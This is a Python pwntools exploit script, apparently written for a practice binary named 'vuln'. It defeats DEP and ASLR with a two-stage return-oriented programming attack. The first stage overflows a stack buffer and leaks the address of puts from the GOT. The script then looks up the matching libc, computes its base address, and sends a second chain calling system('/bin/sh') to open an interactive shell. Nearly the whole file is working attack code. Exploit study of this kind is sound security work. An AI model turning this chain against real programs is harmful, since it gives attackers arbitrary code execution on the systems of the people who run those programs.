#ROP: ret2plt / ret2got  ----> INFO LEAK
#libc de-anonymization, DEP and ASLR bypass

#This is the first exploit sample, it's temporary

from pwn import * # Import pwntools
from pylibcdb.LibcDB import LibcDB

p = process("./vuln") # start the vuln binary
elf = ELF("./vuln")# Extract data from binary
rop = ROP(elf)# Find ROP gadgets

print("PLT:")
print(elf.plt)
print("\nGOT:")
print(elf.got)

PUTS_PLT = elf.plt['puts']
MAIN = elf.symbols['main']
PUTS_GOT = elf.got['puts']
LIBC_START_MAIN = elf.got['__libc_start_main']

POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]# Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("puts@plt: " + hex(PUTS_PLT))
log.info("puts@got: " + hex(PUTS_GOT))
log.info("__libc_start_main@got: " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget: " + hex(POP_RDI))

#Overflow buffer until return address
base = "A"*32 + "B"*8
# Create rop chain
rop = base.encode() + p64(POP_RDI) + p64(PUTS_GOT) +  p64(PUTS_PLT) + p64(MAIN)

#Send our rop-chain payload
p.sendlineafter("ROP.", rop)

#Parse leaked address
p.recvline()
p.recvline()
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00".encode()))
log.info("Leaked libc address, puts: %s" % hex(leak))

libcdb = LibcDB("/home/exploitation/libc-database")
libc_name = libcdb.find_by_address(hex(leak), symbol="puts")
print("NAME OF DISCOVERED LIBC: " +libc_name)
libc_path = libcdb.download_by_name(libc_name)
print("PATH OF DISCOVERED LIBC: " + libc_path)

libc = ELF(libc_path)

libc.address = leak - libc.sym["puts"]
log.info("Address of libc %s " % hex(libc.address))

BINSH = next(libc.search("/bin/sh".encode())) #Verify with find /bin/sh
SYSTEM = libc.sym["system"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))

rop2 = base.encode() + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)

p.sendlineafter("ROP.", rop2)

p.interactive()
